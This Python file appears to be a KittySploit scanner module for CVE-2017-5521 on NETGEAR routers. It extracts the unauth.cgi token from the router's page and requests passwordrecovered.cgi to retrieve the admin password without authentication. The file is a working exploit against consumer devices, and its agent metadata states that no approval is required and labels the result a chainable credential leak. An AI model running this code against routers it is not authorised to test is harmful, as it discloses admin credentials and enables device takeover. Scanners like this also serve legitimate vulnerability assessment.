#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR passwordrecovered.cgi password disclosure (CVE-2017-5521)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR - passwordrecovered.cgi Disclosure (CVE-2017-5521)',
        'description': (
            'Detects CVE-2017-5521 by extracting unauth.cgi?id= token and requesting '
            'passwordrecovered.cgi to recover admin credentials without auth.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'netgear', 'router', 'info-leak', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential_leak', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-5521',
        ],
        'cve': 'CVE-2017-5521',
    }

    def run(self):
        r = self.http_request(method='GET', path='/', allow_redirects=False)
        if not r:
            return False
        headers = '\n'.join(f'{k}: {v}' for k, v in r.headers.items())
        body = (r.text or '') + headers
        if 'Basic realm="NETGEAR' not in body and 'NETGEAR' not in headers:
            # still try if token present
            pass
        m = re.search(r'unauth\.cgi\?id=([0-9]+)', body)
        if not m:
            return False
        token = m.group(1)
        path = f'/passwordrecovered.cgi?id={token}'
        g = self.http_request(method='GET', path=path, allow_redirects=False)
        if not g:
            return False
        text = g.text or ''
        if (
            'You can now log into the router using username' in text
            and 'Router Admin Password' in text
        ):
            self.set_info(
                severity='critical',
                reason='NETGEAR password recovery disclosure (CVE-2017-5521)',
                path=path,
            )
            return True
        return False
